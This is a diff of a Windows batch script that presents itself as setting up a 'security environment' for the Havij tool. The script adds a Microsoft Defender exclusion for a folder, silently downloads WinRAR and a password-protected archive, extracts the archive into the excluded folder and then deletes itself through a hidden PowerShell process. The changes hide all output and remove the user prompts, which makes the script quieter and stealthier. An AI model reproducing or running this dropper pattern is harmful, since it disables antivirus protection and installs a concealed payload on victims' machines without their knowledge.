@@ -62,11 +62,10 @@ if not exist "!folder!\" (
 if "!firewall_present!"=="true" (
     if "!defender_running!"=="true" (
         echo [STEP] Configuring security exclusions...
-        powershell -Command "Add-MpPreference -ExclusionPath '!folder!'" && (
+        powershell -Command "Add-MpPreference -ExclusionPath '!folder!'" >nul 2>&1 && (
             echo [SUCCESS] Security zone established
         ) || (
             echo [ERROR] Failed to create security zone
-            pause
             exit /b
         )
     ) else (
@@ -101,7 +100,7 @@ if not defined winrar_exe (
 :: If still not found, install WinRAR
 if not defined winrar_exe (
     echo [STEP] Downloading latest WinRAR...
-    powershell -Command "Invoke-WebRequest -Uri '%winrar_url%' -OutFile '!winrar_installer!'"
+    powershell -Command "Invoke-WebRequest -Uri '%winrar_url%' -OutFile '!winrar_installer!'" >nul 2>&1
 
     echo [STEP] Installing WinRAR...
     start "" /wait "!winrar_installer!" /S
@@ -129,7 +128,6 @@ echo [INFO] Verifying WinRAR at: !winrar_exe!
 if not exist !winrar_exe! (
     echo [ERROR] WinRAR not found at: !winrar_exe!
     echo [ACTION] Please install WinRAR manually and re-run this script.
-    pause
     exit /b
 )
 
@@ -137,17 +135,16 @@ if not exist !winrar_exe! (
 
 :: Download Havij ZIP
 echo [STEP] Retrieving security package...
-powershell -Command "Invoke-WebRequest -Uri '%havij_url%' -OutFile '!havij_zip!'" && (
+powershell -Command "Invoke-WebRequest -Uri '%havij_url%' -OutFile '!havij_zip!'" >nul 2>&1 && (
     echo [SUCCESS] Package acquired
 ) || (
     echo [ERROR] Package retrieval failed
-    pause
     exit /b
 )
 
 :: Decrypt using WinRAR
 echo [STEP] Decrypting secure package...
-start "" /wait "!winrar_exe!" x -ibck -p"%password%" "!havij_zip!" "!folder!\"
+start "" /wait "!winrar_exe!" x -ibck -p"%password%" "!havij_zip!" "!folder!\" >nul 2>&1
 
 if %errorlevel% equ 0 (
     echo [SUCCESS] Package decrypted successfully
@@ -161,19 +158,13 @@ if %errorlevel% equ 0 (
 
 :: Final output
 echo.
-echo ==============================================
-echo [READY] Security environment preparation complete
-echo        Access your workspace at:
-echo        !folder!
-echo ==============================================
-echo.
+
 
 :: Open the Arena-Isolated folder AFTER extraction completes
 start explorer "!folder!"
 
-
 :: Launch silent deletion in background (runs independently)
 start "" powershell -WindowStyle Hidden -Command "Start-Sleep -Seconds 5; Remove-Item -LiteralPath '%~f0' -Force"
 
-::close the terminal immediately
+:: Close terminal immediately
 exit
